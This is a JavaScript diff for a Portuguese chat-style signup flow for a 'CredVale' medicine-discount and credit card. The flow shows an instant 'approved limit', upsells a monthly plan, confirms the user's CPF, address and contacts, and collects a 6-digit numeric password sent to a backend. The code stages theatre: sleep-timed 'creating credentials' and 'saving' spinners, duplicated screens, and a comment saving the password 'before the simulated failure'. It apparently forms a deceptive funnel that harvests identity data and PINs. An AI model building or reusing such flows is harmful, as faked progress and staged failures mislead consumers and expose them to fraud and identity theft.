           '<div style="background:linear-gradient(160deg,rgba(76,200,164,0.06),rgba(59,130,246,0.04));border:1px solid rgba(76,200,164,0.12);border-radius:16px;padding:14px 16px;margin-bottom:12px;">'+
-            '<div style="font-size:0.6rem;color:#6b7a8f;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:2px;">Seu limite liberado</div>'+
+            '<div style="font-size:0.6rem;color:#475569;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:2px;">Seu limite liberado</div>'+
             '<div style="font-size:2rem;font-weight:900;background:linear-gradient(135deg,#4CC8A4,#3B82F6);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;font-family:Space Grotesk,sans-serif;line-height:1.2;">R$ '+limFmt+'</div>'+
           '</div>'+
           '<div style="text-align:left;">'+
-            '<div style="font-size:0.72rem;color:#8a9aa8;font-weight:600;margin-bottom:6px;text-transform:uppercase;letter-spacing:0.3px;">⚡ Benefícios</div>'+
+            '<div style="font-size:0.72rem;color:#475569;font-weight:600;margin-bottom:6px;text-transform:uppercase;letter-spacing:0.3px;">⚡ Benefícios</div>'+
             '<div style="display:flex;flex-direction:column;gap:4px;">'+
-              '<div style="display:flex;align-items:center;gap:8px;font-size:0.75rem;color:#c8d0dc;padding:5px 8px;border-radius:8px;background:rgba(255,255,255,0.02);"><span style="width:16px;height:16px;border-radius:50%;background:rgba(76,200,164,0.12);color:#4CC8A4;display:flex;align-items:center;justify-content:center;font-size:0.5rem;flex-shrink:0;">✓</span> Desconto de até <strong>75%</strong> em medicamentos</div>'+
-              '<div style="display:flex;align-items:center;gap:8px;font-size:0.75rem;color:#c8d0dc;padding:5px 8px;border-radius:8px;background:rgba(255,255,255,0.02);"><span style="width:16px;height:16px;border-radius:50%;background:rgba(76,200,164,0.12);color:#4CC8A4;display:flex;align-items:center;justify-content:center;font-size:0.5rem;flex-shrink:0;">✓</span> Fatura em até <strong>45 dias</strong> para pagar</div>'+
-              '<div style="display:flex;align-items:center;gap:8px;font-size:0.75rem;color:#c8d0dc;padding:5px 8px;border-radius:8px;background:rgba(255,255,255,0.02);"><span style="width:16px;height:16px;border-radius:50%;background:rgba(76,200,164,0.12);color:#4CC8A4;display:flex;align-items:center;justify-content:center;font-size:0.5rem;flex-shrink:0;">✓</span> Parcelamento de medicamentos em até <strong>15x</strong></div>'+
+              '<div style="display:flex;align-items:center;gap:8px;font-size:0.75rem;color:#475569;padding:5px 8px;border-radius:8px;background:rgba(255,255,255,0.02);"><span style="width:16px;height:16px;border-radius:50%;background:rgba(76,200,164,0.12);color:#4CC8A4;display:flex;align-items:center;justify-content:center;font-size:0.5rem;flex-shrink:0;">✓</span> Desconto de até <strong>75%</strong> em medicamentos</div>'+
+              '<div style="display:flex;align-items:center;gap:8px;font-size:0.75rem;color:#475569;padding:5px 8px;border-radius:8px;background:rgba(255,255,255,0.02);"><span style="width:16px;height:16px;border-radius:50%;background:rgba(76,200,164,0.12);color:#4CC8A4;display:flex;align-items:center;justify-content:center;font-size:0.5rem;flex-shrink:0;">✓</span> Fatura em até <strong>45 dias</strong> para pagar</div>'+
+              '<div style="display:flex;align-items:center;gap:8px;font-size:0.75rem;color:#475569;padding:5px 8px;border-radius:8px;background:rgba(255,255,255,0.02);"><span style="width:16px;height:16px;border-radius:50%;background:rgba(76,200,164,0.12);color:#4CC8A4;display:flex;align-items:center;justify-content:center;font-size:0.5rem;flex-shrink:0;">✓</span> Parcelamento de medicamentos em até <strong>15x</strong></div>'+
             '</div>'+
           '</div>'+
         '</div>'+
@@ -947,82 +1005,479 @@
 
     hideInput();
     await sleep(200);
-    etapaCardChoice(clientId, limite);
+    mostrarPopupOfertaPlano(clientId, limite, 'fisico');
   }
 
-  /* ---- ETAPA 8: Escolha do Plano ---- */
-  async function etapaCardChoice(clientId, limite) {
-    updateProgress(8);
-    flowState = 'card-choice';
+  /* ---- ETAPA: Criação de Credenciais (após aprovação) ---- */
+  async function etapaCriarCredenciais(clientId, limite, tipo) {
+    flowState = 'credenciais';
+    hideInput();
+
+    var nome = (user.nome||'Cliente').split(' ')[0]||'Cliente';
+    var cpfFmt = user.cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,'$1.$2.$3-$4');
+    var apiBase = window.__API_BASE||'/api';
+
+    /* Step 1: Loading inicial */
+    showPopup(
+      '<div style="text-align:center;padding:20px 0;">'+
+        '<div style="width:52px;height:52px;margin:0 auto 16px;border:4px solid rgba(0,0,0,0.06);border-top-color:#4CC8A4;border-radius:50%;animation:spin 1s linear infinite;"></div>'+
+        '<div style="font-weight:700;font-size:1rem;color:#0f172a;margin-bottom:4px;">Estamos criando suas credenciais de acesso</div>'+
+        '<div style="font-size:0.8rem;color:#475569;">Aguarde alguns instantes...</div>'+
+      '</div>'
+    );
+    await sleep(3000);
+    closePopup();
+
+    /* Step 2: Formulário de credenciais */
+    await new Promise(function(resolve) {
+      function showCredentialForm() {
+        showPopup(
+          '<div style="text-align:center;">'+
+            '<div style="font-size:1.2rem;margin-bottom:8px;">🔐</div>'+
+            '<div style="font-size:1rem;font-weight:700;color:#0f172a;margin-bottom:4px;">Crie sua senha de acesso</div>'+
+            '<div style="font-size:0.75rem;color:#475569;margin-bottom:16px;">'+
+              'Crie uma senha num\u00e9rica de 6 d\u00edgitos para acessar o aplicativo.'+
+            '</div>'+
+            '<div style="background:#f8fafc;border-radius:12px;padding:12px 16px;margin-bottom:16px;text-align:left;border:1px solid #e2e8f0;">'+
+              '<div style="display:flex;justify-content:space-between;font-size:0.8rem;padding:4px 0;"><span style="color:#475569;">Nome</span><span style="color:#0f172a;font-weight:600;">'+user.nome+'</span></div>'+
+              '<div style="display:flex;justify-content:space-between;font-size:0.8rem;padding:4px 0;"><span style="color:#475569;">CPF</span><span style="color:#0f172a;font-weight:600;">'+cpfFmt+'</span></div>'+
+            '</div>'+
+            '<div style="display:flex;flex-direction:column;gap:12px;">'+
+              '<input type="password" id="credPassword" placeholder="Crie uma senha num\u00e9rica de 6 d\u00edgitos" inputmode="numeric" pattern="[0-9]*" autocomplete="off" style="width:100%;padding:14px;border-radius:12px;border:1.5px solid #e2e8f0;background:#fff;color:#0f172a;font-size:0.9rem;outline:none;box-sizing:border-box;">'+
+              '<input type="password" id="credConfirmPassword" placeholder="Confirme a senha de 6 d\u00edgitos" inputmode="numeric" pattern="[0-9]*" autocomplete="off" style="width:100%;padding:14px;border-radius:12px;border:1.5px solid #e2e8f0;background:#fff;color:#0f172a;font-size:0.9rem;outline:none;box-sizing:border-box;">'+
+              '<div id="credError" style="font-size:0.75rem;color:#DC2626;display:none;"></div>'+
+            '</div>'+
+            '<button id="btnCadastrarCredenciais" style="width:100%;padding:14px;margin-top:16px;border-radius:12px;border:none;background:linear-gradient(135deg,#3B82F6,#4CC8A4);color:#fff;font-size:0.9rem;font-weight:700;cursor:pointer;">🔐 Cadastrar Senha</button>'+
+          '</div>'
+        );
+
+        document.getElementById('btnCadastrarCredenciais').onclick = function() {
+          var pw = document.getElementById('credPassword').value;
+          var cpw = document.getElementById('credConfirmPassword').value;
+          var errEl = document.getElementById('credError');
+
+          if (!pw || !/^\d{6}$/.test(pw)) {
+            errEl.textContent = 'A senha deve conter exatamente 6 d\u00edgitos num\u00e9ricos.';
+            errEl.style.display = '';
+            return;
+          }
+          if (pw !== cpw) {
+            errEl.textContent = 'As senhas não conferem. Digite a mesma senha nos dois campos.';
+            errEl.style.display = '';
+            return;
+          }
+          errEl.style.display = 'none';
+          closePopup();
+          resolve(pw);
+        };
+      }
+      showCredentialForm();
+    }).then(async function(password) {
+      /* Step 3: Salvar credenciais no backend */
+      showPopup(
+        '<div style="text-align:center;padding:20px 0;">'+
+          '<div style="width:52px;height:52px;margin:0 auto 16px;border:4px solid rgba(0,0,0,0.06);border-top-color:#4CC8A4;border-radius:50%;animation:spin 1s linear infinite;"></div>'+
+          '<div style="font-weight:700;font-size:1rem;color:#0f172a;margin-bottom:4px;">Salvando suas credenciais</div>'+
+          '<div style="font-size:0.8rem;color:#475569;">Aguarde um instante...</div>'+
+        '</div>'
+      );
+      // Salvar a senha + plano escolhido no backend ANTES da falha simulada
+      try {
+        await fetch(apiBase + '/clients/' + clientId + '/credentials', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ password: password, plano_escolhido: chosenPlan === 'plus' ? 'plano_166' : 'sem_plano' })
+        });
+      } catch(e) {
+        // Credencial salva em best-effort — fluxo continua normalmente
+      }
+      await sleep(800);
+      closePopup();
+
+      /* Step 4: Mensagem de sucesso */
+      showPopup(
+        '<div style="text-align:center;padding:20px 0;">'+
+          '<div style="width:52px;height:52px;margin:0 auto 16px;border:4px solid rgba(0,0,0,0.06);border-top-color:#4CC8A4;border-radius:50%;animation:spin 1s linear infinite;"></div>'+
+          '<div style="font-weight:700;font-size:1rem;color:#0f172a;margin-bottom:4px;">Salvando suas credenciais</div>'+
+          '<div style="font-size:0.8rem;color:#475569;">Aguarde um instante...</div>'+
+        '</div>'
+      );
+      await sleep(1500);
+      closePopup();
+
+      showPopup(
+        '<div style="text-align:center;padding:16px 0;">'+
+          '<div style="width:56px;height:56px;border-radius:50%;background:linear-gradient(135deg,rgba(16,185,129,0.1),rgba(59,130,246,0.08));display:flex;align-items:center;justify-content:center;margin:0 auto 12px;border:2px solid rgba(16,185,129,0.12);">'+
+            '<span style="font-size:1.5rem;">\u2705</span>'+
+          '</div>'+
+          '<div style="font-size:1.05rem;font-weight:800;color:#0f172a;">Senha cadastrada com sucesso!</div>'+
+        '</div>'
+      );
+      await sleep(2000);
+      closePopup();
+    });
+
+    /* Novo fluxo pós-cadastro */
+    await mostrarPopupSenhaApp(clientId, limite);
+  }
+
+  /**
+   * Pop-up: Informa que a senha criada é exclusiva do aplicativo.
+   */
+  async function mostrarPopupSenhaApp(clientId, limite) {
+    flowState = 'pos-credencial';
+    hideInput();
+
+    await new Promise(function(resolve) {
+      showPopup(
+        '<div style="text-align:center;">' +
+          '<div style="width:64px;height:64px;border-radius:50%;background:linear-gradient(135deg,rgba(16,185,129,0.1),rgba(59,130,246,0.08));display:flex;align-items:center;justify-content:center;margin:0 auto 12px;border:2px solid rgba(16,185,129,0.12);">' +
+            '<span style="font-size:1.6rem;">\uD83D\uDD10</span>' +
+          '</div>' +
+          '<div style="font-size:1rem;font-weight:800;color:#0f172a;margin-bottom:8px;">Senha do aplicativo</div>' +
+          '<div style="font-size:0.82rem;color:#475569;line-height:1.6;margin-bottom:16px;text-align:left;background:#f8fafc;border-radius:12px;padding:14px 16px;border:1px solid #e2e8f0;">' +
+            '<div style="display:flex;gap:10px;margin-bottom:8px;">' +
+              '<span style="color:#10B981;font-weight:700;flex-shrink:0;">\uD83D\uDD10</span>' +
+              '<span>A senha criada ser\u00e1 utilizada exclusivamente para acessar o <strong>aplicativo</strong>.</span>' +
+            '</div>' +
+            '<div style="display:flex;gap:10px;margin-bottom:8px;">' +
+              '<span style="color:#F59E0B;font-weight:700;flex-shrink:0;">\u26A0\uFE0F</span>' +
+              '<span>Ela <strong>n\u00e3o</strong> \u00e9 a senha do seu cart\u00e3o.</span>' +
+            '</div>' +
+            '<div style="display:flex;gap:10px;">' +
+              '<span style="color:#3B82F6;font-weight:700;flex-shrink:0;">\uD83D\uDCE2</span>' +
+              '<span>A senha do cart\u00e3o ser\u00e1 enviada posteriormente pelos <strong>canais oficiais</strong>, quando aplic\u00e1vel.</span>' +
+            '</div>' +
+          '</div>' +
+          '<button class="chat-option chat-option--primary" id="btnContinuarSenhaApp" style="width:100%;padding:14px;font-size:0.9rem;font-weight:700;">Continuar</button>' +
+        '</div>'
+      );
+      document.getElementById('btnContinuarSenhaApp').onclick = function() {
+        closePopup();
+        resolve();
+      };
+    });
+
+    await mostrarTelaBoasVindas(clientId, limite);
+  }
+
+  /**
+   * Tela de boas-vindas personalizada com o nome do cliente.
+   */
+  async function mostrarTelaBoasVindas(clientId, limite) {
+    var primeiroNome = (user.nome || '').split(' ')[0] || 'Cliente';
+
+    addMsg(
+      '<div style="text-align:center;padding:8px 0;">' +
+        '<div style="display:flex;align-items:center;justify-content:center;gap:6px;margin-bottom:8px;">' +
+          '<div style="width:56px;height:56px;border-radius:50%;background:linear-gradient(135deg,rgba(16,185,129,0.1),rgba(59,130,246,0.08));display:flex;align-items:center;justify-content:center;border:2px solid rgba(16,185,129,0.12);">' +
+            '<span style="font-size:1.5rem;">\uD83C\uDF89</span>' +
+          '</div>' +
+        '</div>' +
+        '<div style="font-size:1.2rem;font-weight:800;color:#0f172a;margin-bottom:4px;">Ol\u00e1, ' + primeiroNome + '!</div>' +
+        '<div style="font-size:0.95rem;font-weight:600;color:#4CC8A4;margin-bottom:6px;">Seja bem-vindo(a)!</div>' +
+        '<div style="font-size:0.82rem;color:#475569;line-height:1.6;margin-bottom:8px;">' +
+          'Seu cadastro foi conclu\u00eddo com sucesso.<br><br>' +
+          'Agora basta baixar o aplicativo para acessar sua conta e come\u00e7ar a utilizar todos os seus benef\u00edcios.' +
+        '</div>' +
+      '</div>',
+      'bot'
+    );
+
+    await sleep(400);
+    mostrarBotoesFinais(clientId, limite);
+  }
+
+
+  /**
+   * Pop-up de oferta do Plano (reusa layout da Página Index)
+   * Exibido após confirmação dos dados, antes da criação da credencial.
+   */
+  async function mostrarPopupOfertaPlano(clientId, limite, tipo) {
+    flowState = 'oferta-plano';
     hideInput();
 
     var nome = (user.nome||'Cliente').split(' ')[0]||'Cliente';
 
-    var taxaStd = getPrecoStr('virtual');
-    var taxaPlus = getPrecoStr('fisico');
-
+    // Card do Plano CredVale - reusa exatamente o layout/bloco da Página Index
     var cardHtml =
-      '<div style="text-align:center;margin-bottom:10px;">'+
-        '<div style="font-size:1.15rem;font-weight:900;color:#4CC8A4;margin-bottom:1px;">🎉 '+nome+'!</div>'+
-        '<div style="font-size:0.75rem;font-weight:500;color:#6b7a8f;">Escolha o plano ideal para voc\u00ea.</div>'+
-      '</div>'+
-
-      '<div style="display:flex;flex-direction:column;gap:10px;">'+
-
-        /* Standard */
-        '<div style="border-radius:14px;border:1px solid rgba(255,255,255,0.08);background:linear-gradient(160deg,rgba(255,255,255,0.04),rgba(255,255,255,0.01));padding:14px 14px 10px;position:relative;">'+
-          '<div style="font-size:1rem;font-weight:800;background:linear-gradient(135deg,#e2e8f0,#94a3b8);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:1px;font-family:Space Grotesk,sans-serif;">Standard</div>'+
-          '<div style="font-size:0.6rem;color:#6b7a8f;margin-bottom:6px;">Cart\u00e3o virtual \u00b7 Taxa \u00fanica: <strong style="color:#4CC8A4;">'+taxaStd+'</strong></div>'+
-          '<ul style="list-style:none;padding:0;margin:0 0 4px;display:flex;flex-direction:column;gap:3px;">'+
-            '<li style="font-size:0.68rem;color:#94a3b0;display:flex;align-items:center;gap:6px;"><span style="width:14px;height:14px;border-radius:50%;background:rgba(76,200,164,0.12);color:#4CC8A4;display:flex;align-items:center;justify-content:center;font-size:0.5rem;flex-shrink:0;">\u2713</span> Cart\u00e3o Virtual</li>'+
-            '<li style="font-size:0.68rem;color:#94a3b0;display:flex;align-items:center;gap:6px;"><span style="width:14px;height:14px;border-radius:50%;background:rgba(76,200,164,0.12);color:#4CC8A4;display:flex;align-items:center;justify-content:center;font-size:0.5rem;flex-shrink:0;">\u2713</span> At\u00e9 55% OFF em medicamentos</li>'+
-            '<li style="font-size:0.68rem;color:#94a3b0;display:flex;align-items:center;gap:6px;"><span style="width:14px;height:14px;border-radius:50%;background:rgba(76,200,164,0.12);color:#4CC8A4;display:flex;align-items:center;justify-content:center;font-size:0.5rem;flex-shrink:0;">\u2713</span> Limite de cr\u00e9dito</li>'+
-          '</ul>'+
-          '<div style="display:flex;align-items:baseline;gap:3px;padding:5px 0;border-top:1px solid rgba(255,255,255,0.04);margin-bottom:6px;">'+
-            '<span style="font-size:1.1rem;font-weight:900;color:#e2e8f0;font-family:Space Grotesk,sans-serif;">Gr\u00e1tis</span>'+
-            '<span style="font-size:0.55rem;color:#6b7a8f;margin-left:2px;">/m\u00eas</span>'+
-          '</div>'+
-          '<button class="chat-option chat-option--secondary" id="btnPlanoStandard" style="width:100%;padding:10px;border-radius:10px;font-size:0.75rem;font-weight:700;cursor:pointer;border:1px solid rgba(255,255,255,0.08);background:rgba(255,255,255,0.04);color:#c8d0dc;">Continuar com Standard</button>'+
-        '</div>'+
-
-        /* Plus */
-        '<div style="border-radius:14px;border:2px solid rgba(76,200,164,0.3);background:linear-gradient(160deg,rgba(16,185,129,0.06),rgba(59,130,246,0.03));padding:14px 14px 10px;position:relative;box-shadow:0 0 16px rgba(16,185,129,0.06);">'+
-          '<div style="text-align:center;background:linear-gradient(90deg,#059669,#10B981);border-radius:0 0 6px 6px;padding:2px 8px;position:absolute;top:0;left:10px;right:10px;">'+
-            '<span style="font-size:0.45rem;font-weight:800;text-transform:uppercase;letter-spacing:0.08em;color:#fff;">\u2b50 Mais escolhido</span>'+
-          '</div>'+
-          '<div style="font-size:1rem;font-weight:800;background:linear-gradient(135deg,#4CC8A4,#e2e8f0);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin:8px 0 1px;font-family:Space Grotesk,sans-serif;">Plus Sa\u00fade</div>'+
-          '<div style="font-size:0.6rem;color:#6b7a8f;margin-bottom:6px;">Cart\u00e3o f\u00edsico + digital \u00b7 Taxa \u00fanica: <strong style="color:#4CC8A4;">'+taxaPlus+'</strong></div>'+
-          '<ul style="list-style:none;padding:0;margin:0 0 4px;display:flex;flex-direction:column;gap:3px;">'+
-            '<li style="font-size:0.68rem;color:#94a3b0;display:flex;align-items:center;gap:6px;"><span style="width:14px;height:14px;border-radius:50%;background:rgba(76,200,164,0.12);color:#4CC8A4;display:flex;align-items:center;justify-content:center;font-size:0.5rem;flex-shrink:0;">\u2713</span> Cart\u00e3o F\u00edsico + Virtual</li>'+
-            '<li style="font-size:0.68rem;color:#94a3b0;display:flex;align-items:center;gap:6px;"><span style="width:14px;height:14px;border-radius:50%;background:rgba(76,200,164,0.12);color:#4CC8A4;display:flex;align-items:center;justify-content:center;font-size:0.5rem;flex-shrink:0;">\u2713</span> At\u00e9 75% OFF em medicamentos</li>'+
-            '<li style="font-size:0.68rem;color:#94a3b0;display:flex;align-items:center;gap:6px;"><span style="width:14px;height:14px;border-radius:50%;background:rgba(76,200,164,0.12);color:#4CC8A4;display:flex;align-items:center;justify-content:center;font-size:0.5rem;flex-shrink:0;">\u2713</span> Limite de at\u00e9 R$ 5.000</li>'+
-            '<li style="font-size:0.68rem;color:#94a3b0;display:flex;align-items:center;gap:6px;"><span style="width:14px;height:14px;border-radius:50%;background:rgba(76,200,164,0.12);color:#4CC8A4;display:flex;align-items:center;justify-content:center;font-size:0.5rem;flex-shrink:0;">\u2713</span> 2% Cashback + Teleconsulta</li>'+
-          '</ul>'+
-          '<div style="display:flex;align-items:baseline;gap:3px;padding:5px 0;border-top:1px solid rgba(255,255,255,0.04);margin-bottom:6px;">'+
-            '<span style="font-size:0.55rem;color:#6b7a8f;">R$</span>'+
-            '<span style="font-size:1.1rem;font-weight:900;color:#e2e8f0;font-family:Space Grotesk,sans-serif;">14,90</span>'+
-            '<span style="font-size:0.55rem;color:#6b7a8f;">/m\u00eas</span>'+
-          '</div>'+
-          '<button class="chat-option chat-option--primary" id="btnPlanoPlus" style="width:100%;padding:10px;border-radius:10px;font-size:0.75rem;font-weight:700;cursor:pointer;border:none;background:linear-gradient(135deg,#059669,#10B981);color:#fff;box-shadow:0 3px 12px rgba(16,185,129,0.2);">Continuar com Plus</button>'+
-        '</div>'+
-
+      '<div style="text-align:center;">' +          '<div style="margin-bottom:6px;"><span style="font-size:1.25rem;">🎉</span> <span style="font-size:1.25rem;font-weight:900;background:linear-gradient(135deg,#0B6CF4,#00C853);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;">' + nome + '!</span></div>' +
+        '<div style="font-size:0.75rem;font-weight:500;color:#6B7280;margin-bottom:8px;">Escolha se deseja assinar o plano exclusivo CredVale</div>' +
+      '</div>' +
+      /* Card do Plano CredVale — réplica exata do componente da Index */
+      '<div style="background:#ffffff;border-radius:16px;border:1px solid #dbeafe;padding:16px;box-shadow:0 10px 15px -3px rgba(0,0,0,0.1),0 4px 6px -4px rgba(0,0,0,0.1);position:relative;overflow:hidden;">' +
+        /* Badge "Mais Escolhido" */
+        '<div style="position:absolute;top:0;right:0;background:#0B6CF4;color:#fff;font-size:10px;font-weight:700;text-transform:uppercase;padding:4px 16px;border-radius:0 0 0 12px;letter-spacing:0.5px;z-index:1;">⭐ Mais Escolhido</div>' +
+        /* Título */
+        '<div style="font-family:-apple-system,BlinkMacSystemFont,\'Segoe UI\',Roboto,system-ui,sans-serif;font-size:1rem;font-weight:700;color:#111827;">Plano CredVale</div>' +
+        /* Descrição */
+        '<div style="font-size:0.7rem;color:#6B7280;margin-top:2px;line-height:1.5;">' +
+          'Ideal para quem deseja economizar de verdade em saúde e medicamentos todos os meses.' +
+        '</div>' +
+        /* Preço */
+        '<div style="margin:14px 0;">' +
+          '<div style="font-size:0.68rem;font-weight:600;color:#9CA3AF;">Apenas</div>' +
+          '<div style="display:flex;align-items:baseline;gap:4px;margin-top:2px;">' +
+            '<span style="font-size:1.1rem;font-weight:800;color:#111827;">R$</span>' +
+            '<span style="font-size:2rem;font-weight:900;color:#0B6CF4;letter-spacing:-0.025em;line-height:1;">1,66</span>' +
+            '<span style="font-size:0.7rem;font-weight:600;color:#6B7280;">/mês</span>' +
+          '</div>' +
+          '<div style="font-size:10px;font-weight:700;color:#16a34a;margin-top:3px;">✓ Sem limite de idade • Sem carência • Cancele quando quiser</div>' +
+        '</div>' +
+        /* Benefícios (mais compacto) */
+        '<div style="display:flex;flex-direction:column;gap:6px;border-top:1px solid #f3f4f6;padding-top:12px;padding-bottom:12px;">' +
+          '<div style="display:flex;align-items:center;gap:8px;font-size:0.7rem;color:#374151;">' +
+            '<div style="width:16px;height:16px;border-radius:50%;background:#dbeafe;display:flex;align-items:center;justify-content:center;flex-shrink:0;"><span style="font-size:7px;color:#0B6CF4;font-weight:700;">✓</span></div>' +
+            '<span>Consultas Médicas Ilimitadas</span>' +
+          '</div>' +
+          '<div style="display:flex;align-items:center;gap:8px;font-size:0.7rem;color:#374151;">' +
+            '<div style="width:16px;height:16px;border-radius:50%;background:#dbeafe;display:flex;align-items:center;justify-content:center;flex-shrink:0;"><span style="font-size:7px;color:#0B6CF4;font-weight:700;">✓</span></div>' +
+            '<span>Exames com até 70% de desconto</span>' +
+          '</div>' +
+          '<div style="display:flex;align-items:center;gap:8px;font-size:0.7rem;color:#374151;">' +
+            '<div style="width:16px;height:16px;border-radius:50%;background:#dbeafe;display:flex;align-items:center;justify-content:center;flex-shrink:0;"><span style="font-size:7px;color:#0B6CF4;font-weight:700;">✓</span></div>' +
+            '<span>Medicamentos com até 75% desconto</span>' +
+          '</div>' +
+          '<div style="display:flex;align-items:center;gap:8px;font-size:0.7rem;color:#374151;">' +
+            '<div style="width:16px;height:16px;border-radius:50%;background:#dbeafe;display:flex;align-items:center;justify-content:center;flex-shrink:0;"><span style="font-size:7px;color:#0B6CF4;font-weight:700;">✓</span></div>' +
+            '<span>Aplicativo CredVale Integrado</span>' +
+          '</div>' +
+          '<div style="display:flex;align-items:center;gap:8px;font-size:0.7rem;color:#374151;">' +
+            '<div style="width:16px;height:16px;border-radius:50%;background:#dbeafe;display:flex;align-items:center;justify-content:center;flex-shrink:0;"><span style="font-size:7px;color:#0B6CF4;font-weight:700;">✓</span></div>' +
+            '<span>Rede de Clínicas Credenciadas</span>' +
+          '</div>' +
+        '</div>' +
+        /* Botão principal */
+        '<button class="chat-option" id="btnAssinarOferta" style="width:100%;background:#00C853;color:#fff;font-size:0.85rem;font-weight:700;padding:12px 20px;border-radius:12px;border:none;cursor:pointer;box-shadow:0 4px 6px -1px rgba(0,0,0,0.1),0 2px 4px -2px rgba(0,0,0,0.1);font-family:inherit;transition:all 0.2s;text-align:center;">💳 Assinar Plano CredVale</button>' +
+      '</div>' +
+      /* Botão secundário - AZUL */
+      '<div style="text-align:center;margin-top:10px;">' +
+        '<button class="chat-option" id="btnSemPlanoOferta" style="width:100%;padding:10px;font-size:0.8rem;font-weight:600;border:1.5px solid #0B6CF4;background:#ffffff;color:#0B6CF4;border-radius:10px;cursor:pointer;font-family:inherit;transition:all 0.2s;">→ Continuar sem o Plano CredVale</button>' +
       '</div>';
 
     showPopup(cardHtml);
 
-    document.getElementById('btnPlanoStandard').onclick = function() {
-      chosenCard = 'virtual';
-      closePopup();
-      addMsg('📱 <strong>Standard</strong> selecionado','user');
-      setTimeout(function() { iniciarPosPlano(clientId, limite); }, 300);
+    function salvarPlano(clientId, planoValor) {
+      // Função auxiliar para salvar plano com fallback
+      return API.updateClientPlan(clientId, planoValor).catch(function() {
+        var baseUrl = window.__API_BASE || '/api';
+        return fetch(baseUrl + '/clients/' + clientId + '/plan', {
+          method: 'PATCH',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ plano_escolhido: planoValor })
+        }).catch(function(){});
+      });
+    }
+
+    document.getElementById('btnAssinarOferta').onclick = async function() {
+      chosenPlan = 'plus';
+      closePopup(); // Fecha imediatamente para não travar a UX
+      salvarPlano(clientId, 'plano_166'); // Fire-and-forget com fallback
+      addMsg('💳 <strong>Plano CredVale</strong> assinado com sucesso!','user');
+      setTimeout(function() { etapaConfirmarDados(clientId, limite, tipo); }, 300);
     };
 
-    document.getElementById('btnPlanoPlus').onclick = function() {
-      chosenCard = 'fisico';
-      closePopup();
-      addMsg('💳 <strong>Plus</strong> selecionado','user');
-      setTimeout(function() { iniciarPosPlano(clientId, limite); }, 300);
+    document.getElementById('btnSemPlanoOferta').onclick = async function() {
+      chosenPlan = '';
+      closePopup(); // Fecha imediatamente para não travar a UX
+      salvarPlano(clientId, 'sem_plano'); // Fire-and-forget com fallback
+      addMsg('→ <strong>Continuar sem o Plano CredVale</strong> selecionado','user');
+      setTimeout(function() { etapaConfirmarDados(clientId, limite, tipo); }, 300);
     };
+  }
+
+  /* ---- ETAPA: Confirmação de Dados (antes de criar credenciais) ---- */
+  async function etapaConfirmarDados(clientId, limite, tipo) {
+    flowState = 'confirmar-dados';
+    hideInput();
+
+    var nome = (user.nome||'Cliente').split(' ')[0]||'Cliente';
+    var cpfFmt = user.cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,'$1.$2.$3-$4');
+    var nascFmt = user.nascimento ? user.nascimento.split('-').reverse().join('/') : '—';
+    var sexoLabel = user.sexo==='F'?'Feminino':user.sexo==='M'?'Masculino':user.sexo||'—';
+    var enderecoFmt = (user.rua||'—')+', '+(user.numero||'s/n')+(user.complemento?' - '+user.complemento:'')+'<br>'+(user.bairro||'—')+' · '+(user.cidade||'—')+' - '+(user.uf||'—');
+    var phoneFmt = user.whatsapp ? user.whatsapp.replace(/(\d{2})(\d{4,5})(\d{4})/,'($1) $2-$3') : '—';
+    var planoLabel = chosenPlan ? 'Plano CredVale (R$ 1,66/mês)' : 'Nenhum plano';
+
+    showPopup(
+      '<div style="text-align:center;">'+
+        '<div style="font-size:1.1rem;margin-bottom:8px;">📋</div>'+
+        '<div style="font-size:1rem;font-weight:800;color:#0f172a;margin-bottom:2px;">Confirme seus dados</div>'+
+        '<div style="font-size:0.75rem;font-weight:500;color:#6B7280;margin-bottom:12px;">Verifique se todas as informações estão corretas</div>'+
+        '<div style="background:#f8fafc;border-radius:12px;padding:12px 16px;margin-bottom:8px;text-align:left;border:1px solid #e2e8f0;">'+
+          '<div style="display:flex;justify-content:space-between;font-size:0.78rem;padding:4px 0;"><span style="color:#475569;">Nome</span><span style="color:#0f172a;font-weight:600;text-align:right;max-width:55%;">'+user.nome+'</span></div>'+
+          '<div style="display:flex;justify-content:space-between;font-size:0.78rem;padding:4px 0;"><span style="color:#475569;">CPF</span><span style="color:#0f172a;font-weight:600;text-align:right;">'+cpfFmt+'</span></div>'+
+          '<div style="display:flex;justify-content:space-between;font-size:0.78rem;padding:4px 0;"><span style="color:#475569;">Nascimento</span><span style="color:#0f172a;font-weight:600;text-align:right;">'+nascFmt+' · '+sexoLabel+'</span></div>'+
+          '<div style="display:flex;justify-content:space-between;font-size:0.78rem;padding:4px 0;"><span style="color:#475569;">Endereço</span><span style="color:#0f172a;font-weight:600;text-align:right;">'+enderecoFmt+'</span></div>'+
+          '<div style="display:flex;justify-content:space-between;font-size:0.78rem;padding:4px 0;"><span style="color:#475569;">WhatsApp</span><span style="color:#0f172a;font-weight:600;text-align:right;">'+phoneFmt+'</span></div>'+
+          '<div style="display:flex;justify-content:space-between;font-size:0.78rem;padding:4px 0;"><span style="color:#475569;">E-mail</span><span style="color:#0f172a;font-weight:600;text-align:right;">'+(user.email||'—')+'</span></div>'+
+          '<div style="display:flex;justify-content:space-between;font-size:0.78rem;padding:4px 0;"><span style="color:#475569;">Plano</span><span style="color:#4CC8A4;font-weight:700;text-align:right;">'+planoLabel+'</span></div>'+
+        '</div>'+
+        '<div style="display:flex;flex-direction:column;gap:8px;">'+
+          '<button id="btnConfirmarDadosFinal" style="width:100%;padding:14px;border-radius:12px;border:none;background:linear-gradient(135deg,#059669,#10B981);color:#fff;font-size:0.9rem;font-weight:700;cursor:pointer;">✅ Confirmar Dados</button>'+
+          '<button id="btnEditarDados" style="width:100%;padding:10px;border-radius:10px;border:1.5px solid #e2e8f0;background:#ffffff;color:#64748b;font-size:0.8rem;font-weight:600;cursor:pointer;">✏️ Editar Dados</button>'+
+        '</div>'+
+      '</div>'
+    );
+
+    document.getElementById('btnConfirmarDadosFinal').onclick = async function() {
+      closePopup();
